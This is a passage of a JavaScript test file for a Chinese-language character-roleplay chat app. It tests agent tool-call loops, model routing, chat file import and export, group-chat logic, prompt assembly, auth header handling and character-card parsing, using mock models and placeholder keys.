  assert.match(text, /用户：你好/);
  assert.ok(!text.includes('后台指令'), '只展示不发送的系统消息不进原文');
});

test('Agent 协议：JSON 容错提取', () => {
  assert.deepEqual(extractJson('{"a":1}'), { a: 1 });
  assert.deepEqual(extractJson('```json\n{"a":2}\n```'), { a: 2 });
  assert.deepEqual(extractJson('好的，这是结果：{"a":3} 就这些'), { a: 3 });
  assert.deepEqual(extractJson('{"text":"里面有 } 括号"}'), { text: '里面有 } 括号' });
  assert.equal(extractJson('完全没有 JSON'), null);
  assert.equal(extractJson(''), null);
});

test('系统提示词：列出技能与协议', () => {
  const prompt = buildSystemPrompt({ skills: demoSkills().list(), maxSteps: 3 });
  assert.match(prompt, /demo\.echo/);
  assert.match(prompt, /"tool"/);
  assert.match(prompt, /最多连续调用 3 步/);
});

test('Agent 循环：调用工具后给最终答案，事件顺序正确', async () => {
  const replies = [
    '{"thought":"需要回声","tool":"demo.echo","args":{"text":"hi"}}',
    '{"thought":"够了","final":"完成"}',
  ];
  let index = 0;
  const model = { complete: async () => ({ text: replies[index++] }) };
  const agent = createAgent({ skills: demoSkills(), model, maxSteps: 3, logger: { debug() {} } });
  const events = [];
  for await (const event of agent.run({ goal: '测试' })) events.push(event);
  assert.deepEqual(
    events.map((event) => event.type),
    ['step', 'thought', 'tool', 'result', 'step', 'thought', 'final'],
  );
  assert.equal(events[3].ok, true);
  assert.deepEqual(events[3].data, { echoed: 'hi' });
  assert.equal(events[6].text, '完成');
});

test('Agent 循环：模型不按协议走时直接收工，不空转', async () => {
  const model = { complete: async () => ({ text: '我就直接说了：她是猫娘。' }) };
  const agent = createAgent({ skills: demoSkills(), model, maxSteps: 3, logger: { debug() {} } });
  const events = [];
  for await (const event of agent.run({ goal: '测试' })) events.push(event.type);
  assert.deepEqual(events, ['step', 'final']);
});

test('Agent 循环：模型调用不存在的工具时会得到纠正并继续', async () => {
  const replies = ['{"tool":"nope.missing","args":{}}', '{"final":"改好了"}'];
  let index = 0;
  const model = { complete: async () => ({ text: replies[index++] }) };
  const agent = createAgent({ skills: demoSkills(), model, maxSteps: 3, logger: { debug() {} } });
  const events = [];
  for await (const event of agent.run({ goal: '测试' })) events.push(event.type);
  assert.deepEqual(events, ['step', 'step', 'final']);
});

test('Agent 循环：模型报错时发出 error 事件', async () => {
  const model = { complete: async () => { throw new Error('上游 401'); } };
  const agent = createAgent({ skills: demoSkills(), model, maxSteps: 2, logger: { debug() {} } });
  const events = [];
  for await (const event of agent.run({ goal: '测试' })) events.push(event);
  assert.deepEqual(events.map((event) => event.type), ['step', 'error']);
  assert.match(events[1].message, /401/);
});

// ---------- 模型路由 ----------

test('模型路由：优先级 群聊成员 > 角色 > 对话 > 全局', () => {
  const bindings = [
    { scope: 'default', targetId: '', kind: 'chat', providerId: 'p-default' },
    { scope: 'chat', targetId: 'c1', kind: 'chat', providerId: 'p-chat' },
    { scope: 'character', targetId: 'ch1', kind: 'chat', providerId: 'p-char' },
    { scope: 'chat_member', targetId: 'm1', kind: 'chat', providerId: 'p-member' },
  ];
  assert.equal(resolveModel({ bindings }).providerId, 'p-default');
  assert.equal(resolveModel({ bindings, chatId: 'c1' }).providerId, 'p-chat');
  assert.equal(resolveModel({ bindings, chatId: 'c1', characterId: 'ch1' }).providerId, 'p-char');
  assert.equal(resolveModel({ bindings, chatId: 'c1', characterId: 'ch1', memberId: 'm1' }).providerId, 'p-member');

  const other = resolveModel({ bindings, chatId: 'c1', characterId: 'ch9' });
  assert.equal(other.providerId, 'p-chat');
  assert.equal(other.sourceTitle, '对话默认');
  assert.equal(other.considered.length, 4);

  const none = resolveModel({ bindings: [], characterId: 'x' });
  assert.equal(none.providerId, null);
  assert.equal(none.source, 'none');
});

test('模型路由：分工预览能看出多模型与共享记忆', () => {
  const bindings = [
    { scope: 'character', targetId: 'hero', kind: 'chat', providerId: 'p1' },
    { scope: 'character', targetId: 'heroine', kind: 'chat', providerId: 'p2' },
  ];
  const plan = planForChat({
    bindings,
    chatId: 'c1',
    members: [
      { id: 'hero', characterId: 'hero', name: '男主' },
      { id: 'heroine', characterId: 'heroine', name: '女主' },
    ],
  });
  assert.equal(plan.multiModel, true);
  assert.equal(plan.distinctProviders, 2);
  assert.equal(plan.sharedMemory, true);
  assert.equal(plan.items.length, 2);
  assert.deepEqual(BINDING_SCOPES.map((scope) => scope.id), ['default', 'chat', 'character', 'chat_member']);
});

test('文本补全适配器：把对话拍成一整段提示词', () => {
  const prompt = flattenPrompt(
    [
      { role: 'user', content: '你好' },
      { role: 'assistant', content: '在的' },
    ],
    '你是角色',
  );
  assert.match(prompt, /^你是角色/);
  assert.match(prompt, /User: 你好/);
  assert.match(prompt, /Assistant: 在的/);
  assert.match(prompt, /Assistant:$/);
});

// ---------- 玩卡区：纯逻辑 ----------

test('对话存档：JSONL 往返不丢字段，富 JSON 也能读回来', () => {
  const messages = [
    { role: 'user', name: '我', content: '你好', tokens: 2, createdAt: '2026-10-03T10:00:00.000Z' },
    { role: 'assistant', name: '阿狸', content: '嗯。', swipes: ['嗯。', '干嘛？'], swipeId: 1, extra: { gen: 1 }, createdAt: '2026-10-03T10:00:05.000Z' },
    { role: 'system', name: '', content: '（旁白）雨停了', hidden: true, createdAt: '2026-10-03T10:00:06.000Z' },
  ];
  const jsonl = chatFileJsonl({ messages, userName: '我', characterName: '阿狸', settings: { theme: 'dark' } });
  assert.equal(jsonl.trim().split('\n').length, 4, '头 + 3 条消息');
  const parsed = parseChatFile(jsonl);
  assert.equal(parsed.format, 'jsonl');
  assert.equal(parsed.userName, '我');
  assert.equal(parsed.characterName, '阿狸');
  assert.equal(parsed.messages.length, 3);
  assert.equal(parsed.messages[0].content, '你好');
  assert.deepEqual(parsed.messages[1].swipes, ['嗯。', '干嘛？']);
  assert.equal(parsed.messages[1].swipeId, 1);
  assert.deepEqual(parsed.messages[1].extra, { gen: 1 });
  assert.equal(parsed.messages[2].role, 'system');
  assert.equal(parsed.messages[2].hidden, true);
  assert.equal(parsed.settings.theme, 'dark');

  const rich = chatFileRich({ title: '测试', messages, character: { name: '阿狸' }, persona: { name: '我' } });
  const round = parseChatFile(JSON.stringify(rich));
  assert.equal(round.format, 'json');
  assert.equal(round.title, '测试');
  assert.equal(round.messages.length, 3);
  assert.equal(round.messages[0].createdAt, '2026-10-03T10:00:00.000Z');

  assert.throws(() => parseChatFile('not json at all'), /第一行不是 JSON/);
  assert.throws(() => parseChatFile('{"nope":1}'), /认不出/);
});

test('群聊策略：自然点名、列表、混合与提示词隔离', () => {
  const members = [
    { id: 'm1', characterId: 'c1', name: '阿狸', talkativeness: 0.5 },
    { id: 'm2', characterId: 'c2', name: '小白', talkativeness: 0.5 },
  ];
  assert.deepEqual(activateMembers({ members, strategy: 'list' }).map((m) => m.id), ['m1', 'm2']);
  assert.deepEqual(activateMembers({ members, strategy: 'manual' }), []);

  const named = activateMembers({ members, strategy: 'natural', input: '小白你怎么看？', rng: () => 0.99 });
  assert.deepEqual(named.map((m) => m.id), ['m2'], '点名优先');

  const notChatty = members.map((m) => ({ ...m, talkativeness: 0 }));
  assert.equal(activateMembers({ members: notChatty, strategy: 'natural', rng: () => 0.4 }).length, 1, '没人激活时兜底挑一个');

  const spoken = spokenSinceUser([
    { role: 'user', content: 'x' },
    { role: 'assistant', characterId: 'c1' },
    { role: 'assistant', characterId: 'c2' },
  ]);
  assert.deepEqual(spoken, ['c2', 'c1']);
  assert.equal(activatePooledOrder(members, { spokenSinceUser: ['c1'], rng: () => 0 }).id, 'm2');

  const merged = combineGroupCards(members, 'm1');
  assert.match(merged.description, /群聊成员：阿狸、小白/);
  assert.match(merged.description, /现在由 阿狸 说话/);
  assert.equal(GROUP_STRATEGIES.length, 4);
  assert.equal(GROUP_MODES.length, 3);
});

test('场景状态：解析 ```state 块、增量合并、骰子', () => {
  const parsed = parseStateDelta('她笑了。\n```state\n{"affection":{"阿狸":3},"attributes":{"体力":-2},"items":[{"name":"铜钥匙"}],"place":"地窖"}\n```');
  assert.equal(parsed.ok, true);
  assert.equal(parsed.text, '她笑了。');
  assert.equal(parsed.delta.place, '地窖');

  const next = applyStateDelta(
    { attributes: { 体力: 10 }, affection: { 阿狸: 5 }, items: [{ name: '铜钥匙', qty: 1 }], quests: [{ title: '找路', status: 'active' }] },
    parsed.delta,
  );
  assert.equal(next.attributes.体力, 8);
  assert.equal(next.affection.阿狸, 8);
  assert.equal(next.items[0].qty, 2);
  assert.equal(next.place, '地窖');
  assert.equal(next.quests[0].title, '找路');

  const broken = parseStateDelta('文本\n```state\n{不是 JSON}\n```');
  assert.equal(broken.found, true);
  assert.equal(broken.ok, false);
  assert.equal(broken.text, '文本', '解析失败也要把块摘掉，别污染对话');

  const roll = rollDice('2d6+3', () => 0);
  assert.deepEqual(roll.rolls, [1, 1]);
  assert.equal(roll.total, 5);
  assert.match(roll.detail, /2d6\+3 = \[1, 1\]\+3 = 5/);
  assert.throws(() => rollDice('abc'), /骰子表达式/);
});

test('叙事控制：候选行动解析与兜底、导演插话', () => {
  const parsed = parseOptions('她说完了。\n```options\n["追问她","检查柜台","回房间"]\n```');
  assert.deepEqual(parsed.options.map((o) => o.text), ['追问她', '检查柜台', '回房间']);
  assert.equal(parsed.text, '她说完了。');

  const fallback = fallbackOptions({ worldState: { place: '酒馆', quests: [{ title: '找地窖', status: 'active' }] }, members: [{ name: '阿狸' }] });
  assert.ok(fallback.length >= 3);
  assert.ok(fallback.some((o) => o.text.includes('找地窖')));

  const narrator = buildDirectorMessage('突然停电了', { mode: 'narrator' });
  assert.equal(narrator.message.role, 'narrator');
  assert.equal(narrator.injection, null);
  const director = buildDirectorMessage('让小白退场', { mode: 'director' });
  assert.equal(director.message, null);
  assert.match(director.injection, /导演指令/);
  const ooc = buildDirectorMessage('我们去吃饭', { mode: 'ooc' });
  assert.equal(ooc.message.role, 'user');
  assert.match(ooc.message.content, /（我们去吃饭）/);
});

test('提示词组装：分层顺序、宏、历史裁剪与状态注入', () => {
  const expanded = expandMacros('{{char}} 对 {{user}} 说 {{random:甲,乙}} {{getvar::hp}}', {
    char: '阿狸',
    user: '我',
    vars: { hp: 12 },
    rng: () => 0,
  });
  assert.equal(expanded.text, '阿狸 对 我 说 甲 12');
  assert.equal(expandMacros('x{{setvar::mood::开心}}', {}).writes[0].key, 'mood');
  // {{random::甲::乙::丙}} 这种"双冒号多项"以前只取第一个（酒馆预设里常这么写）
  const seenRandom = new Set();
  for (let i = 0; i < 60; i += 1) seenRandom.add(expandMacros('{{random::甲::乙::丙::丁}}', { rng: () => i / 60 }).text);
  assert.ok(seenRandom.size >= 3, `:: 形式要能取到多个选项，实际 ${[...seenRandom].join('/')}`);
  assert.equal(expandMacros('{{random:甲,乙,丙}}', { rng: () => 0.9 }).text, '丙', '逗号形式照旧');
  assert.equal(expandMacros('{{pick::甲::乙::丙}}', {}).text, expandMacros('{{pick::甲::乙::丙}}', {}).text, 'pick 要稳定');

  const assembled = assemblePrompt({
    card: { name: '阿狸', description: '一只猫', mes_example: '<START>\n{{user}}: 在吗' },
    persona: { name: '我', description: '旅行者' },
    history: [
      { role: 'user', content: '你好' },
      { role: 'assistant', content: '喵。' },
      { role: 'assistant', content: '（不该发送）', isSystem: true },
      { role: 'assistant', content: '（隐藏但仍发送）', hidden: true },
    ],
    settings: { contextBudget: 4000 },
    worldState: { place: '酒馆', attributes: { 体力: 8 }, quests: [{ title: '找地窖', status: 'active' }] },
  });
  assert.ok(assembled.sections.some((s) => s.id === 'global-system'));
  assert.ok(assembled.sections.some((s) => s.id === 'persona'));
  assert.ok(assembled.sections.some((s) => s.id === 'scene-state'));
  assert.ok(assembled.system.includes('一只猫'));
  assert.equal(assembled.messages.length, 3, 'isSystem 的一条不发送，hidden 的要发送');
  assert.ok(assembled.notes.some((note) => note.includes('世界书')));
  assert.ok(assembled.tokens.total > 0);
  assert.match(describeState({ place: '酒馆', affection: { 阿狸: 3 } }), /好感度：阿狸 3/);

  const trimmed = assemblePrompt({
    card: { name: '阿狸' },
    history: Array.from({ length: 40 }, (_v, i) => ({ role: 'user', content: `第${i}句` })),
    settings: { contextBudget: 30, historyLimit: 40 },
  });
  assert.ok(trimmed.notes.some((note) => note.includes('裁剪')));
});

test('Token 估算与花费：估算有值，没填单价时不许假装 0', () => {
  assert.ok(estimateTokens('你好世界') >= 4);
  assert.ok(estimateTokens('hello world') >= 2);
  assert.equal(computeCost({ promptTokens: 1_000_000, completionTokens: 1_000_000 }, {}), null);
  assert.equal(computeCost({ promptTokens: 1_000_000, completionTokens: 0 }, { priceIn: 2 }), 2);
});

test('玩卡区服务：一轮生成把状态、token、花费、候选行动都落库', async () => {
  const { dir, db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const models = {
      async *chat() {
        yield { type: 'text', text: '她点了点头。' };
        yield { type: 'text', text: '\n```state\n{"affection":{"阿狸":2}}\n```' };
        yield { type: 'text', text: '\n```options\n["追问","观察"]\n```' };
        yield { type: 'usage', usage: { promptTokens: 12, completionTokens: 6, totalTokens: 18 } };
      },
      async complete() {
        return { text: 'ok' };
      },
    };
    const { chat, state, group } = createPlayingServices({
      settings: {},
      ports: {
        chatStore: store,
        models,
        resolveBinding: () => ({ providerId: 'p1', model: 'mock', params: {}, source: 'default', sourceTitle: '全局默认' }),
        providerParams: () => ({ priceIn: 1, priceOut: 2 }),
        saveXray: (entry) => db.repo.run('INSERT INTO prompt_xray (id, chat_id, created_at, sections, text, tokens, notes, model) VALUES (?,?,?,?,?,?,?,?)', [newId('x'), entry.chatId, nowIso(), JSON.stringify(entry.sections), entry.text, JSON.stringify(entry.tokens), JSON.stringify(entry.notes), entry.model]),
      },
    });

    const created = await chat.create({ title: '测试对话', character: { name: '阿狸', description: '猫', first_mes: '喵。' } });
    assert.equal(created.isGroup, false);
    assert.equal(created.members.length, 1);
    assert.equal(created.messageCount, 1, '开场白自动落一条');

    const events = [];
    for await (const event of chat.send(created.id, { text: '你好' })) events.push(event);
    assert.equal(events[0].type, 'start');
    assert.equal(events[0].name, '阿狸');
    assert.ok(events.some((event) => event.type === 'delta'));
    const done = events.find((event) => event.type === 'done');
    assert.equal(done.type, 'done');
    assert.equal(done.text, '她点了点头。');
    assert.equal(done.cost, (12 / 1_000_000) * 1 + (6 / 1_000_000) * 2);
    assert.deepEqual(done.options.map((o) => o.text), ['追问', '观察']);

    const after = await state.get(created.id);
    assert.equal(after.worldState.affection.阿狸, 2);
    const messages = await chat.messages(created.id);
    assert.equal(messages.items.at(-1).tokens, 6);
    assert.equal(messages.items.at(-1).extra.stateDelta.affection.阿狸, 2);

    const xray = db.repo.get('SELECT COUNT(*) AS n FROM prompt_xray');
    assert.equal(xray.n, 1, '每轮存一份提示词快照');
    const plan = await chat.plan(created.id);
    assert.equal(plan.items.length, 1);
    assert.equal(plan.items[0].providerId, 'p1');
    void group;
  } finally {
    cleanup();
  }
});

test('玩卡区服务：同一对话并发生成会被拦下（转录顺序不被搅乱）', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    let release;
    const gate = new Promise((resolve) => { release = resolve; });
    const models = {
      async *chat() {
        yield { type: 'text', text: '第一段' };
        await gate; // 卡住，模拟慢模型
        yield { type: 'text', text: '第二段' };
        yield { type: 'usage', usage: { promptTokens: 1, completionTokens: 1, totalTokens: 2 } };
      },
      async complete() {
        return { text: '' };
      },
    };
    const { chat } = createPlayingServices({
      ports: {
        chatStore: store,
        models,
        resolveBinding: () => ({ providerId: 'p1', model: 'mock', params: {}, source: 'default', sourceTitle: '全局默认' }),
      },
    });
    const created = await chat.create({ title: '并发', character: { name: '阿狸', first_mes: '喵。' } });

    const first = (async () => {
      const events = [];
      for await (const event of chat.send(created.id, { text: '甲' })) events.push(event);
      return events;
    })();
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.equal(chat.isGenerating(created.id), true, '第一条开始后应该占住锁');

    let conflict = null;
    try {
      for await (const event of chat.send(created.id, { text: '乙' })) void event;
    } catch (err) {
      conflict = err;
    }
    assert.ok(conflict, '并发第二条要被拦下');
    assert.equal(conflict.code, 'CONFLICT');

    release();
    const events = await first;
    assert.ok(events.some((event) => event.type === 'done'));
    assert.equal(chat.isGenerating(created.id), false, '跑完要把锁放掉');

    const messages = await chat.messages(created.id);
    assert.ok(!messages.items.some((message) => message.content === '乙'), '被拦下的那条不该进历史');
    assert.equal(messages.items.filter((message) => message.content === '甲').length, 1);
  } finally {
    cleanup();
  }
});

test('玩卡区服务：群聊按成员各用各的模型，提示词互相隔离', async () => {
  const { dir, db, cleanup } = makeTempDb();
  void dir;
  try {
    const store = createChatStore({ repo: db.repo });
    const seen = [];
    const models = {
      async *chat(providerId, options) {
        seen.push({ providerId, system: options.system });
        yield { type: 'text', text: `来自 ${providerId}` };
      },
      async complete() {
        return { text: '' };
      },
    };
    const { chat } = createPlayingServices({
      settings: {},
      ports: {
        chatStore: store,
        models,
        resolveBinding: ({ characterId }) => ({ providerId: characterId === 'c2' ? 'p2' : 'p1', model: null, params: {}, source: 'character', sourceTitle: '角色覆盖' }),
      },
    });
    const created = await chat.create({
      title: '群',
      isGroup: true,
      groupStrategy: 'list',
      groupMode: 'swap',
      greetings: false,
      members: [
        { characterId: 'c1', name: '阿狸', card: { name: '阿狸', description: '猫娘设定' } },
        { characterId: 'c2', name: '小白', card: { name: '小白', description: '狐狸设定' } },
      ],
    });
    assert.equal(created.isGroup, true);
    const events = [];
    for await (const event of chat.send(created.id, { text: '你们好' })) events.push(event);
    const starts = events.filter((event) => event.type === 'start');
    assert.deepEqual(starts.map((event) => event.name), ['阿狸', '小白']);
    assert.deepEqual(seen.map((item) => item.providerId), ['p1', 'p2']);
    assert.ok(seen[0].system.includes('猫娘设定'));
    assert.ok(!seen[0].system.includes('狐狸设定'), 'A 的专属设定不能串给 B');
    assert.ok(seen[1].system.includes('狐狸设定'));
    assert.ok(!seen[1].system.includes('猫娘设定'));
  } finally {
    cleanup();
  }
});

// ---------- 野路子渠道：鉴权 / 请求头 / Vertex / 本地代理 ----------

test('鉴权方式：七种写法与"空 key 不发头"', () => {
  assert.equal(AUTH_STYLES.length, 7);
  assert.equal(DEFAULT_AUTH_STYLE.openai, 'bearer');
  assert.equal(DEFAULT_AUTH_STYLE.azure, 'api-key');
  assert.equal(DEFAULT_AUTH_STYLE.vertex, 'query');

  assert.deepEqual(resolveAuth('bearer', 'sk-1'), { headers: { Authorization: 'Bearer sk-1' }, query: '' });
  assert.deepEqual(resolveAuth('raw', 'sk-2'), { headers: { Authorization: 'sk-2' }, query: '' });
  assert.deepEqual(resolveAuth('api-key', 'sk-3'), { headers: { 'api-key': 'sk-3' }, query: '' });
  assert.deepEqual(resolveAuth('x-api-key', 'sk-4'), { headers: { 'x-api-key': 'sk-4' }, query: '' });
  assert.deepEqual(resolveAuth('x-goog-api-key', 'sk-5'), { headers: { 'x-goog-api-key': 'sk-5' }, query: '' });
  assert.deepEqual(resolveAuth('query', 'sk-6'), { headers: {}, query: 'key=sk-6' });
  assert.deepEqual(resolveAuth('none', 'sk-7'), { headers: {}, query: '' });

  // 没填 key 就不该冒出一个空的 Authorization
  assert.deepEqual(resolveAuth('bearer', ''), { headers: {}, query: '' });
  assert.deepEqual(resolveAuth(undefined, ''), { headers: {}, query: '' });
});

test('URL 拼接：?key= 与已有查询串共存', () => {
  assert.equal(withQuery('https://x/v1/models', ''), 'https://x/v1/models');
  assert.equal(withQuery('https://x/v1/models', 'key=abc'), 'https://x/v1/models?key=abc');
  assert.equal(withQuery('https://x/v1/models?alt=sse', 'key=abc'), 'https://x/v1/models?alt=sse&key=abc');
});

test('Vertex：express 与服务账号两种地址拼装', () => {
  const express = vertexUrl({ mode: 'express', baseUrl: '', model: 'gemini-2.5-pro', method: 'streamGenerateContent', authQuery: 'key=k' });
  assert.equal(express, 'https://aiplatform.googleapis.com/v1/publishers/google/models/gemini-2.5-pro:streamGenerateContent?alt=sse&key=k');

  const sa = vertexUrl({
    mode: 'serviceAccount',
    baseUrl: '',
    project: 'my-proj',
    location: 'us-central1',
    model: 'gemini-2.5-pro',
    method: 'streamGenerateContent',
  });
  assert.equal(sa, 'https://us-central1-aiplatform.googleapis.com/v1/projects/my-proj/locations/us-central1/publishers/google/models/gemini-2.5-pro:streamGenerateContent?alt=sse');

  const claude = vertexModelPath({ mode: 'serviceAccount', project: 'p', location: 'global', model: 'claude-sonnet-4@20250514' });
  assert.match(claude, /^\/v1\/projects\/p\/locations\/global\/publishers\/google\/models\/claude-sonnet-4%4020250514$/);

  assert.throws(() => vertexModelPath({ mode: 'serviceAccount', model: 'x' }), /project/);
});

test('本地代理配置：规范化与基本校验', () => {
  assert.equal(normaliseLauncher(null), null);
  assert.equal(normaliseLauncher({ command: '   ' }), null);

  const spec = normaliseLauncher({ command: 'node', args: 'a b  c', port: '3456' });
  assert.deepEqual(spec.args, ['a', 'b', 'c']);
  assert.equal(spec.port, 3456);
  assert.equal(spec.host, '127.0.0.1');
  assert.equal(spec.timeoutMs, 45000);

  assert.deepEqual(normaliseLauncher({ command: 'npx', args: ['-y', 'foo'] }).args, ['-y', 'foo']);
  assert.equal(isValidLauncher({ command: 'node' }), true);
  assert.equal(isValidLauncher({}), false);
  assert.equal(isValidLauncher(null), false);
});

test('自定义请求头：只收字符串值，键去空白', () => {
  assert.deepEqual(normaliseHeaders({ ' X-Title ': 'Silver Tavern', Empty: null }), { 'X-Title': 'Silver Tavern', Empty: '' });
  assert.deepEqual(normaliseHeaders('nonsense'), {});
  assert.deepEqual(normaliseHeaders(undefined), {});
});

test('前端 api 助手：x-ndjson 不能当 JSON 解析（导出的对话曾经变成 null）', async () => {
  const { api } = await import('../web/core/api.mjs');
  const original = globalThis.fetch;
  try {
    // 酒馆 JSONL 导出的 content-type 里含 "json" 三个字母，但它不是单个 JSON 文档
    globalThis.fetch = async () => new Response('{"a":1}\n{"b":2}\n', { status: 200, headers: { 'Content-Type': 'application/x-ndjson' } });
    assert.equal(await api('/api/chats/x/export'), '{"a":1}\n{"b":2}\n');

    globalThis.fetch = async () => new Response('{"ok":true}', { status: 200, headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    assert.deepEqual(await api('/api/x'), { ok: true });

    globalThis.fetch = async () => new Response('{"ok":true}', { status: 200, headers: { 'Content-Type': 'application/vnd.api+json' } });
    assert.deepEqual(await api('/api/y'), { ok: true });
  } finally {
    globalThis.fetch = original;
  }
});

test('玩卡区服务：坏对话文件报 400 而不是 500，角色变量按角色删', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const { chat, state } = createPlayingServices({ ports: { chatStore: store } });
    const created = await chat.create({ title: '校验', character: { name: '阿狸' }, greetings: false });

    await assert.rejects(() => chat.importChat({ text: '这不是对话文件' }), ValidationError);
    await assert.rejects(() => chat.importChat({ text: '' }), ValidationError);

    await state.put(created.id, { variables: [{ scope: 'character', characterId: 'c-1', key: '好感', value: 5 }] });
    let vars = (await state.get(created.id)).variables;
    assert.equal(vars.length, 1);
    assert.equal(vars[0].scope, 'character');

    await state.put(created.id, { deleteVariables: [{ key: '好感', scope: 'character', characterId: 'c-1' }] });
    vars = (await state.get(created.id)).variables;
    assert.equal(vars.length, 0, '带上 scope 才能删掉角色变量');

    await assert.rejects(() => state.roll(created.id, { expr: '乱写' }), /骰子表达式/);
  } finally {
    cleanup();
  }
});

test('玩卡区服务：插到对话中间不能撞唯一约束，锚点不对要报 404', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const { chat } = createPlayingServices({ ports: { chatStore: store } });
    const created = await chat.create({ title: '插入', character: { name: '阿狸' }, greetings: false });
    // 这里只测 seq 位移与锚点校验，不需要模型，直接往存储里塞三条
    store.appendMessage(created.id, { role: 'user', name: '我', content: '第一句' });
    store.appendMessage(created.id, { role: 'assistant', name: '阿狸', content: '第二句' });
    store.appendMessage(created.id, { role: 'user', name: '我', content: '第三句' });

    const before = await chat.messages(created.id);
    const middle = before.items[2];
    assert.ok(middle, '至少要有三条消息');

    const inserted = await chat.insertMessage(created.id, { afterMessageId: middle.id, role: 'user', content: '（插在中间）' });
    assert.equal(inserted.content, '（插在中间）');
    assert.equal(inserted.seq, middle.seq + 1);

    const after = await chat.messages(created.id);
    assert.equal(after.total, before.total + 1);
    assert.deepEqual(
      after.items.map((message) => message.seq),
      after.items.map((_message, index) => index + 1),
      'seq 要连续且不重复',
    );
    assert.equal(after.items[3].content, '（插在中间）');

    await assert.rejects(
      () => chat.insertMessage(created.id, { afterMessageId: 'msg_不存在', role: 'user', content: 'x' }),
      NotFoundError,
    );
  } finally {
    cleanup();
  }
});

// ---------- 角色卡（写卡区第一块）----------

test('角色卡：V1/V2/V3 识别，未知字段无损往返', () => {
  // V2：data 里塞一个我们不认识的字段，外加一个不认识的顶层键
  const v2 = {
    spec: 'chara_card_v2',
    spec_version: '2.0',
    x_top: { keep: true },
    data: { name: '阿狸', description: '猫娘', tags: ['猫'], x_custom: { a: [1, 2] } },
  };
  const parsedV2 = parseCardBuffer(Buffer.from(JSON.stringify(v2)), 'ali.json');
  assert.equal(parsedV2.spec, 'v2');
  assert.deepEqual(parsedV2.data.x_custom, { a: [1, 2] });

  const backV2 = JSON.parse(writeCardBuffer(parsedV2, { format: 'json' }).buffer.toString('utf8'));
  assert.equal(backV2.spec, 'chara_card_v2');
  assert.deepEqual(backV2.data.x_custom, { a: [1, 2] }, '未知字段要原样保留');
  assert.deepEqual(backV2.x_top, { keep: true }, '未知顶层键也要保留');

  // V1：字段摊在根上，作者备注叫 creatorcomment
  const v1 = { name: '小满', description: 'V1 卡', first_mes: '你好', creatorcomment: '备注', x_root: 7 };
  const parsedV1 = parseCardBuffer(Buffer.from('\uFEFF' + JSON.stringify(v1)), 'man.json');
  assert.equal(parsedV1.spec, 'v1');
  assert.equal(parsedV1.data.creator_notes, '备注', 'creatorcomment 要映射成 creator_notes');
  assert.equal(parsedV1.data.x_root, 7, 'V1 里的其它键也要带着走');

  const backV1 = JSON.parse(writeCardBuffer(parsedV1, { format: 'json', spec: 'v1' }).buffer.toString('utf8'));
  assert.equal(backV1.spec, undefined);
  assert.equal(backV1.name, '小满');
  assert.equal(backV1.creatorcomment, '备注');
  assert.equal(backV1.x_root, 7);

  // V3：spec_version 3.0
  const parsedV3 = normalizeCard({ spec: 'chara_card_v3', spec_version: '3.0', data: { name: '琥珀', assets: [{ type: 'icon' }] } });
  assert.equal(parsedV3.spec, 'v3');
  assert.deepEqual(parsedV3.data.assets, [{ type: 'icon' }]);

  // 既不是 PNG 也不是 JSON 的文件要报可读的错，而不是崩
  assert.throws(() => parseCardBuffer(Buffer.from('这不是卡'), 'x.txt'), ValidationError);
  assert.throws(() => normalizeCard('字符串'), ValidationError);
});

test('角色卡：PNG chara/ccv3 双块读写，ccv3 优先', () => {
  const doc = { spec: 'chara_card_v2', spec_version: '2.0', data: { name: '阿狸', description: '猫娘' } };
  const png = embedCardInPng(null, doc);
  assert.ok(isPng(png), '没有图片时要生成合法 PNG');

  const chunks = readCardTextChunks(png);
  assert.deepEqual(chunks.map((chunk) => chunk.keyword.toLowerCase()).sort(), ['ccv3', 'chara']);

  const found = extractCardJsonFromPng(png);
  assert.equal(found.keyword, 'ccv3', '读卡时 ccv3 优先');
  assert.equal(found.json.spec, 'chara_card_v3');
  assert.equal(found.json.data.name, '阿狸');

  const parsed = parseCardBuffer(png, 'ali.png');
  assert.equal(parsed.spec, 'v3');
  assert.ok(Buffer.isBuffer(parsed.image));
  assert.equal(parsed.data.description, '猫娘');

  // 再写回 PNG，双块还在，且 JSON 文档能被重新读出来
  const out = writeCardBuffer(parsed, { format: 'png' });
  assert.equal(out.mime, 'image/png');
  assert.match(out.filename, /\.png$/);
  const again = parseCardBuffer(out.buffer, out.filename);
  assert.equal(again.data.name, '阿狸');

  // 没有卡数据的 PNG 要明确报错
  const barePng = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
    'base64',
  );
  assert.throws(() => parseCardBuffer(barePng, 'bare.png'), ValidationError);
});

test('角色卡存储：CRUD、标签、版本、回滚、导入导出', async () => {
  const { dir, db, cleanup } = makeTempDb();
  try {
    const store = createCardStore({ repo: db.repo, dataDir: dir });
    const cards = createCardService({ settings: {}, ports: { cardStore: store } });

    const created = await cards.create({ name: '阿狸', description: '猫娘', tags: ['猫', '测试', '猫'], favorite: true });
    assert.ok(created.id.startsWith('char_'));
    assert.equal(created.name, '阿狸');
    assert.deepEqual(created.tags, ['猫', '测试'], '标签要去重');
    assert.equal(created.favorite, true);
    assert.equal(created.versionCount, 1);
    assertShape(created, SHAPES.cardRecord, 'cards.create');

    assert.equal((await cards.list({ q: '阿' })).total, 1);
    assert.equal((await cards.list({ q: '不存在的名字' })).total, 0);
    assert.equal((await cards.list({ tag: '猫' })).total, 1);
    assert.equal((await cards.list({ tag: '狗' })).total, 0);
    assert.equal((await cards.list({ favorite: true })).total, 1);
    assert.equal((await cards.list({ favorite: false })).total, 0);
    assert.equal((await cards.stats()).total, 1);
    assert.ok((await cards.stats()).tags.some((entry) => entry.tag === '猫' && entry.count === 1));

    const updated = await cards.update(created.id, { description: '改过的简介', tags: ['猫'], note: '改简介' });
    assert.equal(updated.data.description, '改过的简介');
    assert.equal(updated.data.name, '阿狸');
    assert.deepEqual(updated.tags, ['猫']);
    assert.equal(updated.versionCount, 2);

    const versions = await cards.listVersions(created.id);
    assert.equal(versions.total, 2);
    const firstVersion = versions.items.find((version) => version.note === '创建');
